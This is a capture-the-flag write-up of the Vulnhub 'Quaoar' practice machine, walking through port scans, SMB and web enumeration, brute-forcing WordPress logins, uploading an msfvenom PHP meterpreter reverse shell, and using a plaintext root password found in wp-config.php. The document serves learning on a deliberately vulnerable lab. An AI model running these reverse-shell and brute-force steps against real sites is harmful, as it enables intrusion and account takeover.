---
layout: single
title: Quaoar - Vulnhub
excerpt: A nice and simple box for someone who is starting out. Has a few different elements and some fun abusing wordpress
date: 2017-04-02
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-quaoar/quaoar_header.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - vulnhub
  - infosec
  - writeup
  - challenges
tags:  
  - wordpress
  - ctf
  - webshells
  - php
  - easy
  - vulnhub
published: true
---

![](/assets/images/vulnhub-writeup-quaoar/quaoar_header.png)



Now we finished the Kioptrix series its time to move on but continuing with the easy ones.

**Name:** hackfest2016: Quaoar

**Date release:** 13 Mar 2017

**Author:** Viper

**Series:** hackfest2016

**Vulnhub:** [https://www.vulnhub.com/entry/hackfest2016-quaoar,180/](https://www.vulnhub.com/entry/hackfest2016-quaoar,180/)

**Description:**

>Welcome to Quaoar
>This is a vulnerable machine i created for the Hackfest 2016 CTF http://hackfest.ca/
>Difficulty : Very Easy
>Tips:
>Here are the tools you can research to help you to own this machine. nmap dirb / dirbuster / BurpSmartBuster nikto wpscan >hydra Your Brain Coffee Google :)
>Goals: This machine is intended to be doable by someone who is interested in learning computer security There are 3 flags on >this machine 1. Get a shell 2. Get root access 3. There is a post exploitation flag on the box
>Feedback: This is my first vulnerable machine, please give me feedback on how to improve ! @ViperBlackSkull on Twitter >simon.nolet@hotmail.com Special Thanks to madmantm for testing
>SHA-256 DA39EC5E9A82B33BA2C0CD2B1F5E8831E75759C51B3A136D3CB5D8126E2A4753
>You may have issues with VMware



## Host Discovery

The VM is nice enough to give us an IP it has picked up.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/1.png)

## Port Scannning 

### TCP

`nmap -sSV -A -O -p- -oA nmap_tcp_full_A_192.168.0.122 192.168.0.122`

```bash
Nmap scan report for 192.168.0.122
Host is up (0.00052s latency).
Not shown: 65526 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d0:0a:61:d5:d0:3a:38:c2:67:c3:c3:42:8f:ae:ab:e5 (DSA)
|   2048 bc:e0:3b:ef:97:99:9a:8b:9e:96:cf:02:cd:f1:5e:dc (RSA)
|_  256 8c:73:46:83:98:8f:0d:f7:f5:c8:e4:58:68:0f:80:75 (ECDSA)
53/tcp  open  domain      ISC BIND 9.8.1-P1
| dns-nsid: 
|_  bind.version: 9.8.1-P1
80/tcp  open  http        Apache httpd 2.2.22 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp open  pop3?
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 3.6.3 (workgroup: WORKGROUP)
993/tcp open  ssl/imap    Dovecot imapd
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
995/tcp open  ssl/pop3s?
| ssl-cert: Subject: commonName=ubuntu/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T04:32:43
|_Not valid after:  2026-10-07T04:32:43
MAC Address: 00:0C:29:12:87:AF (VMware)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: QUAOAR, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.6.3)
|   Computer name: advancedsearch
|   NetBIOS computer name: 
|   Domain name: virginmedia.com
|   FQDN: advancedsearch.virginmedia.com
|_  System time: 2017-06-12T11:30:35-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.52 ms 192.168.0.122

Post-scan script results:
| clock-skew: 
|_  -1s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

### UDP

`nmap -sU -n -oA nmap_udp_def 192.168.0.122`

```bash
Nmap scan report for 192.168.0.122
Host is up (0.00059s latency).
Not shown: 994 closed ports
PORT     STATE         SERVICE
53/udp   open          domain
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
137/udp  open          netbios-ns
138/udp  open|filtered netbios-dgm
5353/udp open          zeroconf
MAC Address: 00:0C:29:12:87:AF (VMware)
```

## Service Enumeration

### 22 - SSH

Nothing can be done with this yet. Brute-forcing faild

### 53 - DNS

Nothing special

### 445 - SMB

`enum4linux 192.168.0.122`

```bash
[+] Got OS info for 192.168.0.122 from smbclient: Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.6.3]

user:[nobody] rid:[0x1f5]
user:[viper] rid:[0x3e8]
user:[wpadmin] rid:[0x3ea]
user:[root] rid:[0x3e9]

//192.168.0.122/IPC$    Mapping: OK Listing: DENIED
//192.168.0.122/print$  Mapping: DENIED, Listing: N/A

Password Complexity: Disabled
Minimum Password Length: 5

S-1-5-21-2958147020-2665463078-3873466888-1000 QUAOAR\viper (Local User)
S-1-5-21-2958147020-2665463078-3873466888-1001 QUAOAR\root (Local User)
S-1-5-21-2958147020-2665463078-3873466888-1002 QUAOAR\wpadmin (Local User)
```

### 80 - HTTP

http://192.168.0.122/

This looks better.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/2.png)

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/3.png)

I ran nikto on this to fidn out more

`nikto -h 192.168.0.122 | tee nikto.txt`

```bash
root@kali:~# nikto -h 192.168.0.122 -o nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.0.122
+ Target Hostname:    192.168.0.122
+ Target Port:        80
+ Start Time:         2018-09-08 08:03:00 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 133975, size: 100, mtime: Mon Oct 24 00:00:10 2016
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3
+ Entry '/wordpress/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 2 entries which should be manually viewed.
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
+ OSVDB-3233: /icons/README: Apache default file found.
+ /wordpress/: A Wordpress installation was found.
+ 8348 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2018-09-08 08:03:15 (GMT-4) (15 seconds)
---------------------------------------------------------------------------
```

looks like we found a word press

http://192.168.0.122/wordpress

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/4.png)

## Exploitation

### Brute-forcing WordPress

Using WPScan i was able to bruteforce some creds to get into wordpress

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/5.png)


<br/>
admin:admin

wpuser:wpuser
<br/>


![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/6.png)

so we login as admin and have a little butch around. Standard wordpress crap here.

Now we need to get a shell on this bad boy.

### Getting a Shell

Here I originally uploaded a web shell simple-backdoor.php but it made life hard.

Use msfvenom to make our shell



`msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.0.19 LPORT=6666 -f raw > shell.php`



we upload **shell.php**

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/7.png)

The upload fails but when looking in the Media tab we can see our payload and view it to obtain the full URL path to the shell.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/8.png)

Prepare and start the multi-handler

`use exploit/multi/handler` <br/>

`set payload php/meterpreter_reverse_tcp` <br/>

`set LHOST 192.168.0.122` <br/>

`set LPORT 6666` <br/>

`run` <br/>

now its time to trigger the payload and establish the session :D

http://192.168.0.122/wordpress/wp-content/uploads/2017/06/shell.php

visiting the page kicks things into action

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/9.png)

:) half way there 

## Privilege Escalation

so now were on the server as www-data user. I uploaded Linenum to help me find a way to get root.

https://github.com/rebootuser/LinEnum

Going through the output I see the wordpress folder and noticed the **wp-config.php** file.

Upon closer inspection things were looking good. Looks like the root user password is stored in plain-text.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/10.png)
<br/>
root
rootpassword!
<br/>
could have maybe got bruteforcing SSH .... o well nearly there.

I jumped out of the shell session and tried the found creds to login as SSH.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/11.png)

got root 😎 😎 😎

now we can read the flag files.

![alt text]({{ site.baseurl }}/assets/images/vulnhub-writeup-quaoar/12.png)

2bafe61f03117ac66a73c3c514de796e

8e3f9ec016e3598c5eec11fd3d73f6fb

You can also read the flag just by connecting to SSH as wpadmin.
